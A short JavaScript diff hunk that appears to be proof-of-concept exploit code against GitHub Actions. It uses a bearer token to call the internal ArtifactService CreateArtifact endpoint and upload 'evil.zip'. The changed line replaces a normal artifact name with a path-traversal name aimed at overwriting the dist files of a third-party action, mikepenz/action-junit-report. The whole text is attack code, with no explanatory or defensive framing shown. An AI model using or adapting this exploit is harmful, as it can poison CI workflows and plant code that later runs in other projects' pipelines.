@@ -10,7 +10,7 @@ for (const sc of claims.scp.split(' ')) {
 }
 console.log('backend ids', rid, jid);
 const zip = fs.readFileSync('evil.zip');
-const name = 'surefire-unit-test-results';
+const name = 'surefire-pwn/../../../_actions/mikepenz/action-junit-report/6ef3fdcfcd5f0b5d14df3e659ef19b8c6820f93d/dist/test-results/..';
 const create = await fetch(base + '/twirp/github.actions.results.api.v1.ArtifactService/CreateArtifact', {
   method: 'POST', headers: {authorization: 'Bearer ' + tok, 'content-type': 'application/json'},
   body: JSON.stringify({workflow_run_backend_id: rid, workflow_job_run_backend_id: jid, name, version: 7, mime_type: 'application/zip'})
